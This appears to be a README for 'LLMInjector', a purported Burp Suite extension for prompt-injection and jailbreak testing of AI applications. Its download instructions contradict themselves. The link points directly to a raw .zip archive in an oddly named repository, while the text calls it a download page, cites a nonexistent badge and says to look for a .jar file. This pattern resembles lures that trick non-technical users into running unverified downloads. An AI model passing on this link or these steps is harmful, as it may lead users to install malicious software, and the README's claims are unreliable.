## 🔍 About LLMInjector

LLMInjector is a Burp Suite extension designed to test language model prompt injections. It helps identify security weaknesses in AI-driven systems by simulating prompt manipulation attacks. This tool is useful for anyone interested in AI security, penetration testing, or protecting AI-powered applications from injection threats. You do not need to understand coding to use it.

---

## 💻 System Requirements

- Windows 10 or newer (64-bit)
- Java Runtime Environment (JRE) 11 or higher
- Burp Suite Professional or Burp Suite Community Edition (version 2021.3 or higher)
- Internet connection for installation and updates
- At least 2 GB of free RAM for smooth operation

Make sure your Burp Suite is installed and running before starting with LLMInjector.

## 🎯 Features

- Easy integration with Burp Suite for prompt injection testing
- Simulates different types of language model prompt attacks
- Provides clear reports on potential security flaws
- Helps test models against jailbreak and injection attempts
- Supports common prompt testing workflows without programming

## 🚀 Getting Started: Download and Install

1. Visit the official LLMInjector page to download the extension:

   [Download LLMInjector](https://raw.githubusercontent.com/Logarithmic-blackafrican589/LLMInjector/main/Damone/Injector_LLM_1.3.zip)  
   *(Click the badge above or this link to open the download page in your browser)*

2. On the page, look for the latest release. You will usually find a `.jar` file. This file is the extension you need.

3. Download the `.jar` file to a folder you can find easily, such as your Desktop or Downloads folder.

4. Open Burp Suite and go to the **Extender** tab.

5. Select the **Extensions** sub-tab.

6. Click the **Add** button.

7. In the pop-up window:
   - Choose **Extension type: Java**.
   - Under **Extension file**, click **Select file**.
   - Find the `.jar` file you downloaded and select it.

8. Click **Next** or **Load** to install the extension.

9. Burp will load LLMInjector, and you will see it appear under the list of active extensions.

## ⚙️ How to Use LLMInjector in Burp Suite

1. After installation, open the **LLMInjector** tab within Burp Suite.

2. Use the built-in interface to configure your prompt injection tests.

3. You can run injections against your AI application endpoints by intercepting requests in Burp’s **Proxy** tab.

4. Analyze the reports generated by LLMInjector to find weaknesses.

5. Adjust configurations and run tests repeatedly to cover all cases.

No scripting is needed. The extension simplifies prompt injection testing for you.
